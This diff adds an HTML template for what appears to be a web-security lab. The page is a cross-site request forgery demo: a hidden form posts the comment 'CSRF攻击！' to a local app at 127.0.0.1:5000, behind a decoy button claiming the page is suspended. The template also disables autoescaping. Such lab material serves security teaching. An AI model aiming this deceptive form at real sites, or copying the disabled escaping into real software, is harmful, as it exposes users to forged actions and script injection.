@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+{% autoescape false %}
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Web安全实验</title>
+  </head>
+
+  <body>
+
+    <!-- Header -->
+    <header>
+      <h1>Web安全实验</h1>
+      
+    <form action="http://127.0.0.1:5000/" method="POST">
+        <input type="hidden" name="comment" value="CSRF攻击！" />
+        <input type="submit" value="该界面暂停使用。点击该按钮返回新界面" />
+    </form>
+
+  </body>
+</html>
+{% endautoescape %}
